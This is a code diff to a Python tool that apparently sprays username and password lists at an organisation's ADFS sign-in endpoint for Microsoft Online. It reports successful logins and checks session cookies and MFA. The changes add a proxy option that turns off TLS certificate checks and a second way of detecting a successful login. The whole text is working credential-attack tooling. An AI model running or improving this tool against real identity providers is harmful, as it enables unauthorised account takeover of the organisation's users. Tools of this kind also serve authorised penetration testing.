@@ -3,6 +3,7 @@ import argparse
 import re
 import html
 import time
+import urllib3
 from colorama import Fore, Style
 from datetime import datetime
 
@@ -91,6 +92,14 @@ def parse_arguments():
         help="Delay in seconds between login attempts (e.g., --delay 2 for 2 seconds delay)",
     )
 
+    parser.add_argument(
+        "-x",
+        "--proxy",
+        type=str,
+        required=False,
+        help="Specify a proxy host to send all traffic through (e.g., http://your-proxy-host:port)",
+    )
+
     return parser.parse_args()
 
 
@@ -115,13 +124,20 @@ def extract_saml_assertion(adfs_login_response):
     else:
         return None
 
+
 def check_authentication_cookies(login_srf_response):
     cookies = login_srf_response.cookies
     return "ESTSAUTHPERSISTENT" in cookies and "ESTSAUTH" in cookies
 
 
 def send_login_request(
-    target, username, password, verbose=False, log_file=None, check_mfa=False
+    target,
+    username,
+    password,
+    verbose=False,
+    log_file=None,
+    check_mfa=False,
+    proxy=None,
 ):
     if verbose:
         log_message(f"[*] Trying login for {username}", log_file, color=Fore.WHITE)
@@ -138,6 +154,11 @@ def send_login_request(
 
     try:
         with requests.Session() as session:
+            if proxy:
+                urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+                session.proxies = {"http": proxy, "https": proxy}
+                session.verify = False
+
             adfs_login_response = session.post(
                 f"{target}/adfs/ls/?client-request-id=&wa=wsignin1.0&wtrealm=urn:federation:MicrosoftOnline&wctx=cbcxt=&username={username}",
                 data=payload,
@@ -145,11 +166,13 @@ def send_login_request(
                 timeout=10,
             )
             adfs_login_response.raise_for_status()
-
             if (
                 adfs_login_response.status_code == 200
                 and 'action="https://login.microsoftonline.com:443/login.srf"'
                 in adfs_login_response.text
+            ) or (
+                adfs_login_response.status_code == 302
+                and target in adfs_login_response.headers.get("Location", "")
             ):
                 log_message(
                     f"[+] Login success: {username} : {password}",
@@ -252,11 +275,15 @@ if __name__ == "__main__":
             exit(1)
 
     if not usernames:
-        print(f"{Fore.RED}[!] No usernames provided. Please provide a username or a list of usernames.{Style.RESET_ALL}")
+        print(
+            f"{Fore.RED}[!] No usernames provided. Please provide a username or a list of usernames.{Style.RESET_ALL}"
+        )
         exit(1)
 
     if not passwords:
-        print(f"{Fore.RED}[!] No passwords provided. Please provide a password or a list of passwords.{Style.RESET_ALL}")
+        print(
+            f"{Fore.RED}[!] No passwords provided. Please provide a password or a list of passwords.{Style.RESET_ALL}"
+        )
         exit(1)
 
     print_banner()
@@ -271,6 +298,7 @@ if __name__ == "__main__":
                 verbose=verbose,
                 log_file=log_file,
                 check_mfa=check_mfa,
+                proxy=args.proxy,
             )
             if delay:
                 time.sleep(delay)
